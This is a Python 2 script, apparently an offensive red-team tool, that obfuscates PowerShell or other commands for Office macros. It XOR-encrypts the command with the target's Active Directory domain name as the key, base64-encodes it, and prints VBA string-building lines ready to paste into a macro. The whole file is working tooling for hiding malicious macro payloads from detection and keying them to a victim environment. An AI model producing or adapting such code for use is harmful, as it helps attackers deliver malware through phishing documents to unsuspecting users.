#!/usr/bin/env python

import argparse
import base64
import sys

def chunks(l, n): # shamelessly ganked from Empire
    """Generator to split a string l into chunks of size n."""
    for i in xrange(0, len(l), n):
        yield l[i:i+n]

def main():
	"""Main function of script"""
	parser = argparse.ArgumentParser(description='Script to obfuscate PowerShell (or other) commands in Office macros.')
	parser.add_argument('-f', '--file', help='file containing command to obfuscate', required=True)
	parser.add_argument('-d', '--domain', help='internal AD domain name', required=True)
	args = parser.parse_args()

	with open(args.file) as infile:
		source_data = infile.readlines()[0]
	key = args.domain.lower()

	xorWord = lambda ss,cc: ''.join(chr(ord(s)^ord(c)) for s,c in zip(ss,cc*len(source_data))) # shamelessly ganked from stackoverflow
	encrypt = xorWord(source_data, key)
	decrypt = xorWord(encrypt ,key)
	final_payload = base64.b64encode(encrypt)
	
	print('[*] Payload to encrypt:\n\n{0}\n').format(source_data)
	print('[*] Key: {0}').format(key)
	print('\n[*] Verifying decryption is successful...')
	if xorWord(encrypt, key) == source_data:
		print('\n[+] Success!')
	else:
		print('[-] Decryption failed, please check parameters and try again.')
		sys.exit(1)

	payload_chunks = list(chunks(final_payload, 50))
	payload = "\tDim Str As String\n"
	payload += "\tstr = \"" + str(payload_chunks[0]) + "\"\n"
	for chunk in payload_chunks[1:]:
		payload += "\tstr = str + \"" + str(chunk) + "\"\n"

	print('\n[*] Encrypted and encoded payload for macro:\n\n{0}').format(payload)

if __name__ == '__main__':
	main()